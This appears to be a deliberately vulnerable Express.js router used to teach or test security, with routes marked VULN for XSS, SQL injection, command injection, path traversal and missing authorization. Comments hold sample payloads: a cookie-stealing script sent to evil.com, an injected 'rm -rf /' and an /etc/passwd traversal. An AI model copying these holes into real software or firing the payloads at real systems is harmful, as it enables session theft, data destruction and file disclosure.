const express = require('express');
const router  = express.Router();
const { exec } = require('child_process');
const db = require('../db');

// VULN: Reflected XSS — user input rendered directly without sanitization
router.get('/profile', (req, res) => {
    const name = req.query.name;
    // Attacker sends: ?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
    res.send(`<h1>Welcome, ${name}!</h1>`);   // No escaping
});

// VULN: SQL Injection via template literal
router.get('/search', async (req, res) => {
    const term = req.query.q;
    const rows = await db.query(`SELECT * FROM users WHERE email LIKE '%${term}%'`);
    res.json(rows);
});

// VULN: Command injection — user controls command parameter
router.post('/export', (req, res) => {
    const format = req.body.format;  // 'csv', 'json', or attacker payload
    const userId = req.body.user_id;

    // Attacker sends format = "csv; rm -rf / ; echo"
    exec(`python3 scripts/export.py --format ${format} --user ${userId}`,
        (err, stdout, stderr) => {
            if (err) { res.status(500).json({ error: stderr }); return; }
            res.send(stdout);
        }
    );
});

// VULN: Path traversal — user controls file path
router.get('/download', (req, res) => {
    const file = req.query.file;
    // Attacker sends: ?file=../../../../etc/passwd
    res.sendFile(`/app/uploads/${file}`);
});

// VULN: Insecure direct object reference — no auth check
router.get('/admin/users/:id', async (req, res) => {
    const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
    res.json(user);   // Returns any user's full record including password hash
});

module.exports = router;
